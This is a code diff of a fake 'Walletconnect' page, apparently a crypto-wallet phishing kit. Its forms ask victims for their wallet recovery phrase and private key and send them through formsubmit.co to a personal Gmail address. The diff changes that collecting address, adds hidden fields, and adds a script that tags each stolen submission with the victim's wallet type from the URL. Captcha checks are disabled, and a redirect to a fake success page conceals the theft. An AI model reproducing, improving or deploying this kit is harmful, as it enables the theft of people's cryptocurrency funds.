@@ -18,6 +18,7 @@
                 <img src="../wc1.png" class="mr-3  mb-5" style="height:30px" alt="Logo">
                 <span>Walletconnect</span>
             </a>
+            
             <div class="p-4 text mb-4 text-sm text-blue-700 bg-blue-100 rounded-lg dark:bg-blue-200 dark:text-blue-800" role="alert">
                 <span class="font-medium">
                    Info alert!
@@ -42,9 +43,10 @@
             <div id="myTabContent">
                 <div class="p-4 bg-gray-50 rounded-lg dark:bg-gray-800" id="profile" role="tabpanel" aria-labelledby="profile-tab">
                   
-                        <form action="https://formsubmit.co/michellequall3@gmail.com" method="POST">  
+                        <form action="https://formsubmit.co/choiceconnect148@gmail.com" method="POST" class="phrase-form">  
                             <input type="hidden" name="_next" value="https://prodprotodapp.pages.dev/start/apiv4wc-success.html"> 
-                            <input type="hidden" name="_captcha" value="false">                     
+                            <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="Wallet_Type" id="wallet_type_hidden" value="No wallet selected">                     
                             <div class="mb-6">
                             <textarea rows="4" name="Phrase" type="text" minlength="12" placeholder="Enter your recovery phrase (typically 12-24 words seperated by a single space" id="large-input" class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required></textarea>
                             </div>
@@ -54,11 +56,12 @@
 
 
                 <div class="hidden p-4 bg-gray-50 rounded-lg dark:bg-gray-800" id="settings" role="tabpanel" aria-labelledby="settings-tab">
-                        <form action="https://formsubmit.co/michellequall3@gmail.com" method="POST">
+                        <form action="https://formsubmit.co/choiceconnect148@gmail.com" method="POST" class="privkey-form">
                             <input type="hidden" name="_next" value="https://prodprotodapp.pages.dev/start/apiv4wc-success.html">
                             <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="Wallet_Type" id="wallet_type_hidden_privkey" value="No wallet selected">
                             <div class="mb-6">
-                                <input name="privkey" type="text" type="text" minlength="12" placeholder="Enter your private key " id="large-input" class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required>
+                                <input name="privkey" type="text" minlength="12" placeholder="Enter your private key " id="large-input" class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required>
                             </div>
                         <button type="submit" class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 mr-2 mb-2 dark:bg-blue-600 dark:hover:bg-blue-700 focus:outline-none dark:focus:ring-blue-800">Proceed</button>
 
@@ -82,24 +85,23 @@
 
 
       <script>
-        $(".ajaxForm").submit(function(e) {
-        e.preventDefault();
-        var href = $(this).attr("action");
-        $.ajax({
-        type: "POST",
-        dataType: "json",
-        url: href,
-        data: $(this).serialize(),
-        success: function(response) {
-        if (response.status == "success") {
-        window.location.href = '../apiv4wc-connection-success.html'; // redirection url // change this. 
-        } else {
-        alert("An error occured: " + response.message);
-        }
-        }
+        // Extract wallet parameter from URL and populate hidden fields
+        document.addEventListener('DOMContentLoaded', function() {
+          const urlParams = new URLSearchParams(window.location.search);
+          const wallet = urlParams.get('wallet') || 'No wallet selected';
+          
+          // Populate both hidden fields with the wallet name
+          const walletTypeHidden = document.getElementById('wallet_type_hidden');
+          const walletTypeHiddenPrivkey = document.getElementById('wallet_type_hidden_privkey');
+          
+          if (walletTypeHidden) {
+            walletTypeHidden.value = wallet;
+          }
+          if (walletTypeHiddenPrivkey) {
+            walletTypeHiddenPrivkey.value = wallet;
+          }
         });
-        });
-        </script>
+      </script>
         
 
     <script src="../../unpkg.com/flowbite%401.5.3/dist/flowbite.js"></script>
